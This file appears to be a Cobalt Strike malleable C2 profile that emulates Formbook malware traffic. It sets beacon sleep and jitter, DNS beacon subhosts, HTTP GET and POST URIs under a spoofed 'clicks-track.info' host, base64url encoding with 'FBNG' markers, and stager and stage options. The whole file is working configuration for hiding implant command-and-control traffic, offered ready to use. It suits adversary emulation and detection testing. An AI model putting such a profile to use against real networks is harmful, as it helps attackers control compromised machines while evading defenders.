#formbook malware
#taken from --> https://www.fireeye.com/blog/threat-research/2017/10/formbook-malware-distribution-campaigns.html
#xx0hcd

set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla Firefox/4.0";

dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}


http-get {
    
    set uri "/list/hx28/config.php";
    
    client {

	header "Host" "www.clicks-track.info";
	header "Connection" "close";
	
        
        metadata {
            base64url;
	    parameter "id";

        }


    }

    server {

	header "Server" "Apache/2.4.18 (Ubuntu)";
	header "Connection" "close";
	header "Content-Type" "text/html; charset=utf-8";
        

        output {

            base64url;

            print;
        }
    }
}

http-post {
    
    set uri "/List/hx28/config.php";

    client {

	header "Host" "www.clicks-track.info";
	header "Connection" "close";
	#header "Cache-Control" "no-cache";
	header "Origin" "http://www.clicks-track.info";
	header "Content-Type" "application/x-www-form-urlencoded";
	header "Accept" "*/*";
	#header "Referer" "http://www.clicks-track.info/list/hx28/config.php";    
	header "Accept-Language" "en-US";
	#header "Accept-Encoding" "gzip, deflate";
        
        output {
            base64url;
	    print;
	    


        }


        id {
            base64url;
	    parameter "id";
	    #header "Cookie";

        }

    }

    server {

	header "Server" "Apache/2.4.18 (Ubuntu)";
	header "Connection" "close";
	header "Content-Type" "text/html; charset=utf-8";
        
        
        output {
            base64url;
	    prepend "FBNG0x31";
	    append "FBNG";
            print;
        }

    }
}

http-stager {

    set uri_x86 "/list/HX28/config.php";
    set uri_x64 "/list/hx28/Config.php";


    client {

	header "Host" "www.clicks-track.info";
	header "Connection" "close";

    }

    server {

	header "Connection" "close";
	header "Cache-Control" "no-cache";	
	header "Content-Type" "application/x-www-form-urlencoded";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";
	header "Accept-Encoding" "gzip, deflate";
	

	output {
	    print;
	}
    
    }


}

stage {
	set userwx "true";
	set compile_time "09 Jun 2012 13:19:49Z";
	set image_size_x86 "747652";
	set image_size_x64 "747652";
	#set obfuscate "true";
}
